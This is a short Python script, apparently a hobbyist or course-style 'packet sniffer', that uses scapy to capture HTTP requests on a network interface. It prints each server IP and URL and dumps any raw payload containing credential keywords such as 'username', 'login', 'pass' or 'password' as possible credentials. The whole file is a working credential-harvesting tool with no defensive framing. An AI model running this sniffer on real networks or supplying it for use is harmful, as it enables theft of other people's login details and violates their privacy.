#!/usr/bin/env python3

import scapy.all as scapy
from scapy.layers import http
from optparse import OptionParser


def ascii_console_art():
    print('''
  _____            _        _          _  ___  ___ 
(_____ \          | |      | |        (_)/ __)/ __)
 _____) )___  ____| |  _    \ \  ____  _| |__| |__ 
|  ____/ _  |/ ___) | / )    \ \|  _ \| |  __)  __)
| |   ( ( | ( (___| |< ( _____) ) | | | | |  | |   
|_|    \_||_|\____)_| \_|______/|_| |_|_|_|  |_|   
''')
    print('Network packet sniffer, developed and coded by Saher Muhamed - version 1.0.0')
    print('============================================================================')


def get_arguments():
    parser = OptionParser()
    parser.add_option('-i', '--interface', dest='iface', help='specify you card interface, run (ifconfig)')
    (options, arguments) = parser.parse_args()
    if not options.iface:
        parser.error("[-] Please specify a valid interface card, or type it correctly, ex: --interface wlan0")
    return options


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        print(f'[+] Server IP ==> {str(packet[scapy.IP].dst)}')
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(f'[+] Url discovered ==> {url}')
        if packet.haslayer(scapy.Raw):
            load = str(packet[scapy.Raw].load)
            keywords = ['uname', 'username', 'login', 'usr', 'usrname', 'pass', 'email', 'password']
            for keyword in keywords:
                if keyword in load:
                    print(f'[+] Possible credentials ==> {load}')
                    break


ascii_console_art()
my_interface = get_arguments()
sniff(interface=my_interface.iface)
